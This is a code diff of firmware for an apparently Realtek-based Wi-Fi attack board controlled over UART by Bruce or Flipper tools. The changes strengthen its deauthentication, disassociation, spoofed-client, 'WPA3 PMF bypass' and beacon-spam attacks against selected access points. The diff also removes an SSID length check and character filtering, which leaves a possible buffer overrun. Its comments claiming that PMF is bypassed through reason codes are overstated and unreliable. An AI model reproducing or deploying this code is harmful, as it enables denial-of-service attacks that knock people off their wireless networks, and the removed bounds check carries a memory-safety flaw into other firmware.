@@ -60,7 +60,6 @@ int selectedTargets[MAX_TARGETS];
 int selectedCount = 0;
 
 volatile bool isScanning = false;
-volatile bool scanCompleteTrigger = false;
 String serialBuffer0 = "";
 String serialBuffer1 = "";
 static int cachedChannel = -1;
@@ -81,7 +80,6 @@ const int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 14
 const int totalChannels = 19;
 
 // --- DUAL UART HELPER (Truyền đồng thời cả Port 0 và Port 1) ---
-// Dùng cho protocol messages mà Bruce OS cần nhận: SCAN:OK, AP:, [STOPPED], sci
 void uartPrint(const String &s) {
   Serial.print(s);
   Serial1.print(s);
@@ -95,13 +93,6 @@ void uartPrintln(const String &s) {
 void uartPrintln() {
   Serial.println();
   Serial1.println();
-}
-
-// --- DEBUG LOG (Chỉ gửi ra Serial0/USB cho PC, KHÔNG gửi sang ESP32) ---
-// Dùng cho log trạng thái tấn công: [DEAUTH], [WPA3], [SELECTED], [ATTACK STARTED]
-// Nếu gửi sang ESP32 → Bruce parse lỗi → "ERROR: Command not found" → ESP32 crash
-void debugLog(const String &s) {
-  Serial.println(s);
 }
 
 // --- LED CONTROL ---
@@ -134,21 +125,12 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   if (scan_result->scan_complete != RTW_TRUE) {
     if (scanCount >= MAX_NETWORKS) return RTW_SUCCESS;
     rtw_scan_result_t *record = &scan_result->ap_details;
-    
-    // Đảm bảo không ghi đè tràn buffer rtw_ssid_t val[33]
-    if (record->SSID.len > 32) record->SSID.len = 32;
     record->SSID.val[record->SSID.len] = 0; 
 
     NetworkInfo net;
-    memset(&net, 0, sizeof(NetworkInfo));
     if (record->SSID.len > 0) {
-      for (size_t k = 0; k < record->SSID.len && k < 32; k++) {
-        char c = (char)record->SSID.val[k];
-        // Lọc ký tự điều khiển có thể làm vỡ parser phân tách tab (\t) của Bruce
-        if (c == '\t' || c == '\r' || c == '\n') c = ' ';
-        net.ssid[k] = c;
-      }
-      net.ssid[record->SSID.len] = '\0';
+      strncpy(net.ssid, (const char*)record->SSID.val, 32);
+      net.ssid[32] = '\0';
     } else {
       strcpy(net.ssid, "<hidden>");
     }
@@ -165,10 +147,6 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
         if (net.rssi > scanResults[i].rssi) {
           scanResults[i].rssi = net.rssi;
           scanResults[i].channel = net.channel;
-          if (strcmp(scanResults[i].ssid, "<hidden>") == 0 && strcmp(net.ssid, "<hidden>") != 0) {
-            strncpy(scanResults[i].ssid, net.ssid, 32);
-            scanResults[i].ssid[32] = '\0';
-          }
         }
         break;
       }
@@ -180,6 +158,7 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
         bool is5g_old = (scanResults[i].channel > 14);
         if (is5g_new == is5g_old) {
           exists = true;
+          // Nếu node mới có sóng mạnh hơn, cập nhật sang node mạnh hơn
           if (net.rssi > scanResults[i].rssi) {
             scanResults[i] = net;
           }
@@ -191,9 +170,6 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
       scanResults[scanCount] = net;
       scanCount++;
     }
-  } else {
-    // Driver AmebaD đã quét xong tất cả các kênh 2.4GHz & 5GHz
-    scanCompleteTrigger = true;
   }
   return RTW_SUCCESS;
 }
@@ -245,20 +221,18 @@ void stopAttack() {
 void printScanResults();
 
 void startScan() {
-  if (isScanning) return;
   stopAttack();
   scanCount = 0; 
   selectedCount = 0; 
   isScanning = true;
-  scanCompleteTrigger = false;
   
   setLedColor(0, 0, 1); // LED xanh dương khi khởi động scan
-  delay(50);
+  delay(100);
 
   int ret = wifi_scan_networks(scanResultHandler, NULL);
   if (ret != RTW_SUCCESS) {
     for (int r = 0; r < 3; r++) {
-      delay(100);
+      delay(150);
       ret = wifi_scan_networks(scanResultHandler, NULL);
       if (ret == RTW_SUCCESS) break;
     }
@@ -267,38 +241,31 @@ void startScan() {
   // Khôi phục lại driver Wi-Fi nếu bị kẹt sau quá trình raw packet injection
   if (ret != RTW_SUCCESS) {
     wifi_off();
-    delay(150);
-    wifi_on(RTW_MODE_STA);
     delay(200);
+    wifi_on(RTW_MODE_STA);
+    delay(300);
     ret = wifi_scan_networks(scanResultHandler, NULL);
   }
 
   if (ret == RTW_SUCCESS) {
     uartPrintln("[SCAN STARTED...]");
-    unsigned long scanStartMs = millis();
-    unsigned long lastHbMs = millis();
-    int ledStep = 0;
-
-    // Chờ không đồng bộ theo tín hiệu hoàn tất thực tế từ AmebaD driver (tối đa 7000ms timeout)
-    while (!scanCompleteTrigger && (millis() - scanStartMs < 7000)) {
-      delay(50);
-      ledStep++;
-      if (ledStep % 4 == 0) {
-        setLedColor(0, ((ledStep / 4) % 2 == 0) ? 1 : 0, 0); // Nhấp nháy LED xanh lá cây
+    // Quét các kênh trong 4 giây (40 x 100ms)
+    // Nhấp nháy LED xanh lá cây và gửi heartbeat "sci" định kỳ mỗi giây để Bruce không timeout
+    for (int i = 0; i < 40; i++) {
+      delay(100);
+      setLedColor(0, (i % 2 == 0) ? 1 : 0, 0);
+      if (i % 10 == 0) {
+        uartPrintln("sci");
       }
-      if (millis() - lastHbMs >= 1000) {
-        lastHbMs = millis();
-        uartPrintln("sci"); // Heartbeat gửi định kỳ mỗi giây để Bruce không timeout
-      }
-      taskYIELD();
     }
     
     isScanning = false;
-    scanDoneTime = millis();
     uartPrintln(""); 
+    flushUartBuffers(); // Xóa sạch lệnh thừa ("sc" hoặc "SCAN") tích tụ trong hàng đợi lúc quét
     uartPrintln("SCAN:OK");
     printScanResults();
     currentLedState = LED_GREEN_WAIT; 
+    scanDoneTime = millis();
   } else {
     isScanning = false;
     currentLedState = LED_OFF;
@@ -330,115 +297,121 @@ void setup() {
 
 // --- ATTACK LOGIC ---
 void setTargetChannel(int ch) {
-  if (ch <= 0 || ch > 165) return;
+  if (ch <= 0) return;
   if (cachedChannel != ch) {
-    // Phát hiện chuyển băng tần: 2.4GHz (ch ≤ 14) ↔ 5GHz (ch > 14)
-    bool crossBand = (cachedChannel > 0) && ((cachedChannel <= 14) != (ch <= 14));
     wifi_set_channel(ch);
     cachedChannel = ch;
-    if (crossBand) {
-      delay(50); // PLL cần thời gian dài hơn khi đổi giữa 2.4GHz và 5GHz
-    } else {
-      delay(10); // Cùng băng tần: 10ms đủ cho PLL lock
-    }
+    delay(20); // Thời gian cho RF synthesizer / PLL và DMA ổn định tần số kênh mới
   }
 }
 
 void atkDeauth() {
-  static unsigned long lastBurstTime = 0;
   static int currentTargetIdx = 0;
+  static int burstCount = 0;
   static unsigned long lastLogTime = 0;
   static uint32_t packetCount = 0;
-  
-  // Throttle bằng millis(): 40ms giữa các đợt → ~25 burst/giây (~75 pkt/s)
-  // RAM validation trong wifi_tx_raw_frame() đảm bảo không crash dù gửi nhanh
-  unsigned long now = millis();
-  if (now - lastBurstTime < 40) return;
-  lastBurstTime = now;
   
   if (selectedCount == 0) return;
   if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
   
   int targetID = selectedTargets[currentTargetIdx];
-  currentTargetIdx++;
-  if (targetID < 0 || targetID >= scanCount) return;
+  if (targetID < 0 || targetID >= scanCount) {
+    currentTargetIdx = 0;
+    return;
+  }
   
   NetworkInfo target = scanResults[targetID];
   setTargetChannel(target.channel);
 
-  // Xoay vòng 5 reason code khác nhau để bypass filter trên một số router
-  static const uint16_t reasons[] = {1, 2, 4, 6, 7};
-  uint16_t reason = reasons[(packetCount / 3) % 5];
-
   digitalWrite(PIN_LED_R, HIGH);
   
-  // Gửi 3 frame mỗi burst: Deauth + Disassoc + Deauth (reason khác)
-  // Gửi CẢ deauth + disassoc gấp đôi hiệu quả (một số thiết bị chỉ phản hồi 1 loại)
-  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-  delay(1);
-  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-  delay(1);
-  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", (reason == 7) ? 1 : reason + 1);
+  // Tấn công tổ hợp: Deauth + Disassoc 2 chiều cực mạnh
+  // 1. AP -> Broadcast (Deauth Reason 2 & 6)
+  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+  delay(2);
+  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+  delay(2);
+
+  // 2. AP -> Broadcast (Disassoc Reason 8 & 1 - Cực mạnh với iOS/Android/Windows 11)
+  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 8);
+  delay(2);
+  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 1);
+  delay(2);
+
+  // 3. Reverse Spoofing: Client -> AP (Buộc Router xóa session table)
+  wifi_tx_deauth_frame((void *)"\xFF\xFF\xFF\xFF\xFF\xFF", target.bssid, 2);
+  delay(2);
   
   digitalWrite(PIN_LED_R, LOW);
-  packetCount += 3;
+  packetCount += 5;
 
-  // Log tiến trình mỗi 2 giây + số lỗi TX để debug
-  if (now - lastLogTime > 2000) {
-    lastLogTime = now;
-    String log = "[DEAUTH] Pkts:" + String(packetCount) + " CH:" + String(target.channel) + " " + String(target.ssid);
-    if (tx_fail_count > 0) log += " TxErr:" + String(tx_fail_count);
-    uartPrintln(log);
+  // Thực hiện 4 burst liên tiếp trên cùng 1 kênh trước khi chuyển mục tiêu
+  // Chống nhảy kênh liên tục làm treo RF Synthesizer của chip
+  burstCount++;
+  if (burstCount >= 4) {
+    burstCount = 0;
+    currentTargetIdx = (currentTargetIdx + 1) % selectedCount;
   }
+
+  if (millis() - lastLogTime > 2000) {
+    lastLogTime = millis();
+    uartPrintln("[DEAUTH ACTIVE] Pkts: " + String(packetCount) + " | CH: " + String(target.channel) + " | Target: " + String(target.ssid));
+  }
+
+  delay(25); // Nghỉ 25ms cho DMA giải phóng buffer
 }
 
 void atkWpa3() {
-  static unsigned long lastBurstTime = 0;
   static int currentTargetIdx = 0;
+  static int burstCount = 0;
   static unsigned long lastLogTime = 0;
   static uint32_t packetCount = 0;
-  
-  unsigned long now = millis();
-  if (now - lastBurstTime < 80) return;
-  lastBurstTime = now;
   
   if (selectedCount == 0) return;
   if (currentTargetIdx >= selectedCount) currentTargetIdx = 0;
   
   int targetID = selectedTargets[currentTargetIdx];
-  currentTargetIdx++;
-  if (targetID < 0 || targetID >= scanCount) return;
+  if (targetID < 0 || targetID >= scanCount) {
+    currentTargetIdx = 0;
+    return;
+  }
   
   NetworkInfo target = scanResults[targetID];
   setTargetChannel(target.channel);
 
-  // Reason codes hiệu quả với PMF/WPA3: 6 (Class 2), 7 (Class 3), 23 (IEEE 802.11w)
-  static const uint16_t reasons[] = {6, 7, 23, 24, 39};
-  uint16_t reason = reasons[(packetCount / 3) % 5];
-
   digitalWrite(PIN_LED_R, HIGH);
-  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-  delay(1);
-  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-  delay(1);
+  
+  // WPA3 PMF (Protected Management Frames) Bypass & SAE Fault Injection
+  // Reason 23: IEEE 802.11w PMF Violation
+  // Reason 18: Invalid SAE Commit Frame
+  // Reason 19: Invalid SAE Confirm Frame
   wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23);
-  digitalWrite(PIN_LED_R, LOW);
-  packetCount += 3;
+  delay(2);
+  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 23);
+  delay(2);
+  wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 18);
+  delay(2);
+  wifi_tx_disassoc_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 19);
+  delay(2);
 
-  if (now - lastLogTime > 2000) {
-    lastLogTime = now;
-    String log = "[WPA3] Pkts:" + String(packetCount) + " CH:" + String(target.channel) + " " + String(target.ssid);
-    if (tx_fail_count > 0) log += " TxErr:" + String(tx_fail_count);
-    uartPrintln(log);
+  digitalWrite(PIN_LED_R, LOW);
+  packetCount += 4;
+
+  burstCount++;
+  if (burstCount >= 4) {
+    burstCount = 0;
+    currentTargetIdx = (currentTargetIdx + 1) % selectedCount;
   }
+
+  if (millis() - lastLogTime > 2000) {
+    lastLogTime = millis();
+    uartPrintln("[WPA3 ACTIVE] Pkts: " + String(packetCount) + " | CH: " + String(target.channel) + " | Target: " + String(target.ssid));
+  }
+
+  delay(25);
 }
 
 void atkBeaconRandom() {
-  static unsigned long lastBurstTime = 0;
-  unsigned long now = millis();
-  if (now - lastBurstTime < 50) return;
-  lastBurstTime = now;
-
   static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   char rand_ssid[17];
   int len = random(6, 15);
@@ -455,18 +428,15 @@ void atkBeaconRandom() {
   setTargetChannel(ch);
 
   digitalWrite(PIN_LED_R, HIGH);
-  wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
-  delay(1);
-  wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
+  for (int i = 0; i < 3; i++) {
+    wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rand_ssid);
+    delay(5);
+  }
   digitalWrite(PIN_LED_R, LOW);
+  delay(50);
 }
 
 void atkBeaconRickroll() {
-  static unsigned long lastBurstTime = 0;
-  unsigned long now = millis();
-  if (now - lastBurstTime < 50) return;
-  lastBurstTime = now;
-
   static int songIdx = 0;
   uint8_t rand_bssid[6];
   rand_bssid[0] = 0x02;
@@ -481,6 +451,7 @@ void atkBeaconRickroll() {
   wifi_tx_beacon_frame(rand_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", rick_roll[songIdx]);
   songIdx = (songIdx + 1) % 8;
   digitalWrite(PIN_LED_R, LOW);
+  delay(50);
 }
 
 void handleAttack() {
@@ -525,14 +496,14 @@ void processCommand(String cmd) {
   
   // 1. Lệnh quét mạng (Bruce "sc" hoặc Flipper "SCAN")
   if (cmd == "sc" || cmd.startsWith("SCAN")) {
-    if (isScanning) return;
-    // Chống quét trùng lặp khi Bruce gửi đồng thời cả "SCAN" và "sc" liên tiếp
-    if (millis() - scanDoneTime < 4000 && scanCount > 0) {
+    static unsigned long lastScanTime = 0;
+    // Chống quét trùng lặp khi Bruce gửi đồng thời cả "SCAN" và "sc"
+    if (millis() - lastScanTime < 3000 && scanCount > 0) {
       uartPrintln("SCAN:OK");
       if (cmd == "sc") printScanResults();
-      else printRtlScanList();
       return;
     }
+    lastScanTime = millis();
     startScan();
   }
   // 2. Lệnh chọn mục tiêu Bruce ("sl:1,2,3" hoặc "sl:0")
@@ -687,7 +658,7 @@ void loop() {
     } 
     else { 
       serialBuffer0 += c; 
-      if (serialBuffer0.length() > 256) serialBuffer0 = ""; // Chống cạn kiệt FreeRTOS heap
+      if (serialBuffer0.length() > 128) serialBuffer0 = "";
     }
   }
 
@@ -702,7 +673,7 @@ void loop() {
     } 
     else { 
       serialBuffer1 += c; 
-      if (serialBuffer1.length() > 256) serialBuffer1 = ""; // Chống cạn kiệt FreeRTOS heap
+      if (serialBuffer1.length() > 128) serialBuffer1 = "";
     }
   }
 
